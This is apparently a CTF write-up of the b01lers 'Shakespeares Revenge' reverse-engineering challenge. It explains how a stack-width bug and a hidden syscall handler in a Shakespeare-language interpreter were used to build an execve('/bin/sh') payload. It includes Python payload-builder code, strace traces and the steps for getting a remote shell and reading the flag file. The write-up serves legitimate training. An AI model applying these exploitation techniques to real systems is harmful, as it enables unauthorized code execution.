---
title: "Shakespeares Revenge"
date: 2026-04-27T14:17:36+07:00
draft: false
tags: ["CTF", "RE"]
categories: ["b01lersctf"]
contest: "b01lersctf"
author: "k1nt4r0u"
description: "Writeup for Shakespeares Revenge Writeup from b01lersctf"
difficulty: "Easy/Medium/Hard"
---
- Event: b01lers CTF
- Category: Reverse Engineering
- Challenge: `rev/shakespeares-revenge`
- Files: `server.py`, `shakespeare`, `challenge.spl`
- Remote: `ncat --ssl shakespeares-revenge.opus4-7.b01le.rs 8443`
- Flag: `bctf{4_p0und_0f_fl35h}`

This challenge looked like a Shakespeare-language calculator at first, but the real solve was a VM bug that turned the calculator into a syscall primitive. The interesting part was not the Python wrapper or the SPL script alone. It was the way the interpreter compiled that script, how it stored stack values, and how Scene VI quietly mapped to a hidden syscall operation.

## Challenge Setup

The first thing worth checking was the wrapper. `server.py` does almost nothing beyond launching the interpreter on the provided script:

```python
challenge_bin = script_dir / "shakespeare"
challenge_file = script_dir / "challenge.spl"
exit_code = subprocess.call([str(challenge_bin), str(challenge_file)])
```

So the actual challenge surface is the binary and the SPL program, not the server.

The script itself reads like a tiny calculator:

- Scene II asks for numeric input.
- Scene III says "sum".
- Scene IV says "product".
- Scene V says "difference".
- Scene VI looks like cleanup.

That is enough to suggest a normal arithmetic VM, but the binary immediately hints that there is more going on. `file` shows that `shakespeare` is a PIE ELF with debug info and it is not stripped, and `nm -C` exposes symbols such as:

- `RuntimeCharacter::push(long long)`
- `RuntimeCharacter::pop()`
- `RuntimeCharacter::reference_stack_cstring()`
- `syscall_argument_count(long long)`
- `invoke_syscall(long long, std::vector<long long> const&)`

The string table is even more direct. It contains runtime errors like:

- `Unknown syscall number for argument count:`
- `Not enough values on stack for syscall`
- `No referenced stack available for cstring substitution`

At that point the "calculator" explanation was already incomplete. The important question became: how does Scene VI reach that syscall machinery?

## First Pass on the SPL Program

The relevant part of `challenge.spl` is Scene II:

```text
Hamlet:
 Listen to your heart.
 Remember thyself.
 Listen to your heart.
 Remember thyself.

Romeo:
 Listen to your heart.
 Are you better than a cute cute cat?
 If so, let us proceed to Scene VI.
 Are you better than the sum of a cute cat and a cat?
 If so, let us proceed to Scene V.
 Are you better than a cute cat?
 If so, let us proceed to Scene IV.
 Are you better than a cat?
 if so, let us proceed to Scene III.
```

It reads like three inputs per loop:

1. first number
2. second number
3. selector

The subtle detail is that the scene transitions are strict greater-than checks, not equality checks. Printing the compiled operations in `gdb` made that clear. The four thresholds are:

- `> 4` -> Scene VI
- `> 3` -> Scene V
- `> 2` -> Scene IV
- `> 1` -> Scene III

That means the usable selectors are:

- `2` -> Scene III (`add`)
- `3` -> Scene IV (`multiply`)
- `4` -> Scene V (`subtract`)
- `>= 5` -> Scene VI (the hidden path)

This explains one early failure mode. Sending `1` as the selector does not go to Scene III. It falls through the comparisons, hits `[Exeunt]`, and eventually breaks later execution because the expected characters are no longer on stage.

## Recovering the Real Runtime Model

The next step was to stop reading the SPL source as prose and instead inspect the compiled runtime state. Breaking at `ShakespeareInterpreter::Impl::run()` and printing `this->runtime_play.operations_` showed that the play compiles to 43 operations.

The pieces that mattered were:

- Scene I compiles Romeo's `Reference Romeo.` into a `REFERENCE` operation.
- Scene II compiles to two numeric `INPUT`s and two `PUSH`es that move those inputs onto Romeo's stack.
- The third input is read into Romeo's value and only used for the strict `QUESTION`/`GOTO` dispatch.
- Scene VI compiles to a single `SYSCALL` operation with `syscall_character = "Hamlet"`.

That last point was the big pivot. Scene VI is not cleanup in any meaningful sense. It is the syscall gadget.

## The Core Bug: 64-bit Push, 32-bit Pop

The most important reversing result came from `RuntimeCharacter::push` and `RuntimeCharacter::pop`.

`push(long long)` splits a value into 32-bit halves:

```c
hi = value >> 32;
lo = value & 0xffffffff;

if (hi != 0)
    stack.push_back(hi);
stack.push_back(lo);
```

`pop()` only removes one stack entry:

```c
v = stack.back();
stack.pop_back();
return decode(v);
```

And `decode(unsigned int)` is just:

```c
return eax;
```

That last detail matters more than it looks. `decode()` zero-extends the 32-bit cell. It does not sign-extend it.

So the bug is:

- pushes may add one or two 32-bit cells
- pops always consume one 32-bit cell
- values like `0xffffffff` come back as `4294967295`, not `-1`

This creates a stack-width mismatch that is perfect for building synthetic syscall frames.

## The Hidden Syscall Operation

The `SYSCALL` handler uses Hamlet's stack.

Its flow is:

1. Peek Hamlet's top stack cell as the syscall number.
2. Look up the allowed argument count with `syscall_argument_count()`.
3. Pop the syscall number.
4. Pop `argc` more values into an argument vector.
5. Call `invoke_syscall(syscall_number, args)`.

There are two details that shaped the exploit.

### 1. The handler recognizes a special sentinel

If one popped value is `0xffffffff`, it is not used as the numeric value `4294967295`. It is replaced with a C string built from the referenced character's stack:

```c
if (popped == 0xffffffff)
    popped = reference_stack_cstring(...).c_str();
```

Because Scene I made Romeo reference himself, Hamlet's reference source points at Romeo's stack. That turns `0xffffffff` into a "use Romeo's stack as a string pointer" sentinel.

### 2. Arguments are passed in pop order

The argument vector is filled in the same order values are popped from Hamlet's stack, and `invoke_syscall` uses `args[0]`, `args[1]`, and so on directly.

That means the top-down Hamlet stack must look like:

```text
[syscall_nr, arg0, arg1, arg2, ...]
```

not the other way around.

## How Romeo's Stack Becomes a String

`stack_cstring()` iterates the referenced stack from top to bottom until it reaches a zero byte. In other words, if Romeo's stack is:

```text
bottom -> [0, 'h', 's', '/', 'n', 'i', 'b', '/'] <- top
```

then reading from top downward produces:

```text
"/bin/sh"
```

and stops once it reaches the bottom `0`.

So the exploit must build Romeo's stack as:

- a zero terminator at the bottom
- the target string in reverse order above it

That single detail is what makes the `0xffffffff` sentinel usable for `write` and `execve`.

## Turning the Calculator into a Frame Builder

Once the scene selector and stack semantics were understood, each Scene II loop became a tiny compiler pass:

- input 1 contributes one byte that survives on Romeo's stack
- input 2 is a crafted 64-bit number
- input 3 chooses which arithmetic scene runs next

From an exploitation perspective, one loop iteration can leave:

- one controlled byte on Romeo's stack
- one controlled 32-bit cell on Hamlet's stack

I only needed two arithmetic gadgets:

- multiply to make zero: `1 * 0 = 0`
- add to make arbitrary positive values: `1 + (x - 1) = x`

That gives a compact payload builder:

```python
def cycle(retained_byte, result):
    if result == 0:
        hb, lb, op = 1, 0, 3          # 1 * 0 = 0
    elif result == 0xFFFFFFFF:
        hb, lb, op = 1, 0xFFFFFFFE, 2 # 1 + 4294967294 = 4294967295
    else:
        hb, lb, op = 1, result - 1, 2 # 1 + (x-1) = x
    return [retained_byte, (hb << 32) | lb, op]
```

The last Scene II trip does not need an arithmetic scene at all. It only needs to append the final two Romeo bytes and jump into Scene VI with selector `5`.

## Proving the Primitive with `write`

Before going for a shell, the simplest proof was a `write` syscall. The stack needs to look like this from Hamlet's top:

```text
[1, 1, 0xffffffff, count]
```

which corresponds to:

```c
write(1, Romeo_stack_as_cstring, count)
```

Using a short Romeo string confirmed the primitive cleanly. A local write-probe payload printed:

```text
ABCD
```

That was enough to confirm:

- the selector logic
- the Hamlet frame layout
- the `0xffffffff` sentinel
- the Romeo string order
- the reverse pop order of syscall arguments

## The Important Pivot: Zero-Extension Broke the First `execve` Attempt

The local `write` probe worked before `execve` did. The last real bug in the builder came from assuming the popped 32-bit values behaved like signed integers.

They do not.

The first `execve("/bin/sh", 0, 0)` attempt looked close, but `strace` showed:

```text
execve("/bin/sh", NULL, 0x1) = -1 EFAULT
```

That result was exactly what was needed: the string pointer was correct, but one of the supposed null pointers was really `1`.

The reason was the zero-generation logic. A value that looked like it should behave like `-1` or collapse into zero under a signed interpretation did not do that here, because `decode()` zero-extends. Once I switched zero generation to the multiply scene, the local trace became:

```text
execve("/bin/sh", NULL, NULL) = 0
```

That was the point where the exploit was effectively solved. The rest was remote interaction and clean output capture.

## Final Exploit Strategy

The final payload used:

- Romeo stack: reversed `/bin/sh` with a bottom zero terminator
- Hamlet top-down frame: `[59, 0xffffffff, 0, 0]`

which invokes:

```c
execve("/bin/sh", NULL, NULL)
```

The cleaned builder in the final solver is:

```python
def build_stack_string(text_bytes):
    rev = list(text_bytes[::-1])
    prefix = [0] + rev[:-2]
    final_pair = rev[-2:]
    return prefix, final_pair


def build_execve_payload(path_bytes=b'/bin/sh'):
    prefix, final_pair = build_stack_string(path_bytes)
    meaningful = [0, 0, 0xFFFFFFFF, 59]
    results = ([123] * (len(prefix) - len(meaningful))) + meaningful

    payload = []
    for b, r in zip(prefix, results):
        payload += cycle(b, r)

    payload += [final_pair[0], final_pair[1], 5]
    return payload
```

One remote-specific detail mattered after `execve`: the shell starts with an empty environment because both `argv` and `envp` are null. Builtins like `echo` still work, but external commands do not resolve until `PATH` is set.

So the interaction sequence was:

1. send the numeric payload
2. wait briefly for `execve` to happen
3. send `echo __SHELL__` as a marker
4. set `PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin`
5. read `/app/flag.txt`

## Remote Verification

Running the final solver produced:

```text
[+] sending execve payload with 21 numeric inputs
__SHELL__

__FLAG_BEGIN__
bctf{4_p0und_0f_fl35h}__FLAG_END__

[+] FLAG: bctf{4_p0und_0f_fl35h}
```

The flag was stored in `/app/flag.txt`.

## Final Flag

```text
bctf{4_p0und_0f_fl35h}
```

## Takeaway

This was a reverse challenge with a very pwn-shaped finish. The SPL script was useful for recovering the control flow, but the solve really hinged on three implementation details in the interpreter:

- `push(long long)` stores one or two 32-bit cells
- `pop()` consumes exactly one 32-bit cell and zero-extends it
- Scene VI compiles to a hidden syscall handler with a special `0xffffffff` string sentinel

Once those pieces were in place, the calculator scenes became a reliable way to synthesize a syscall frame, and `execve("/bin/sh", NULL, NULL)` was the shortest path to the remote flag.

The full exploit used for the solve is the current `remote_solver.py` in this directory.
